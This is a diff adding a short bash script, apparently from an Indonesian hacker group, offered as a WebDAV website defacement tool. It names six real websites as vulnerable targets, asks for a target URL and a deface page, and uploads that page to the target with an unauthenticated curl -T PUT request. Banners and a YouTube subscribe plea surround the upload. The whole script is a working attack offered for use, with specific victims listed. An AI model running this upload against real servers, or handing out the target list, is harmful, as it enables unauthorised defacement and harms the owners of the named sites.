@@ -1,0 +1,58 @@
+
+
+#lu recode gua sumpahin melarat#
+
+clear
+sleep 1
+echo "[+] Tunggu Bentar..." | lolcat
+sleep 3
+clear
+figlet Wellcome | lolcat
+sleep 2
+clear
+echo "_______________________________________________________
+
+                 [ Tools Deface Webdav ]
+
+[+] Coded   : Bartes Dwiky
+[+] Team    : ClayHackerTeam (private)
+[+] Github  : https://github.com/ClayHackerTeam
+[+] Contact : clayhackerteam404@gmail.com
+[+] Youtube : FREE TUTORIAL
+
+_______________________________________________________" | lolcat
+sleep 1
+echo "[+] Waiting For Server.." | lolcat
+sleep 3
+echo "[+] Jika Belum Punya Web Vuln Webdav,Bisa ambil di sini" | lolcat
+sleep 2
+echo "_____________________________________
+
+﻿http://africaprop.co.za/
+
+ http://ballastbrokers.co.za/
+
+ http://www.ajaxfilebrowser.com/
+
+ http://hq.prospec.co.th/
+
+ http://branch.prospec.co.th/
+
+ http://bestilling.udir.no
+_____________________________________" | lolcat
+
+echo "[+] Website Target : " $target |lolcat
+read target
+echo "[+] Tunggu.." | lolcat
+sleep 2
+echo "[+] Nama Script Defacenya : " $sc |lolcat
+read sc
+curl -T /storage/emulated/0/$sc $target
+echo "[+] Cek Websitenya Pake .html" | lolcat
+sleep 2
+echo "[+] Done!! " | lolcat
+sleep 20
+clear
+echo "Jangan lupa subscribe channel FREE TUTORIAL ya" | lolcat
+sleep 5
+clear
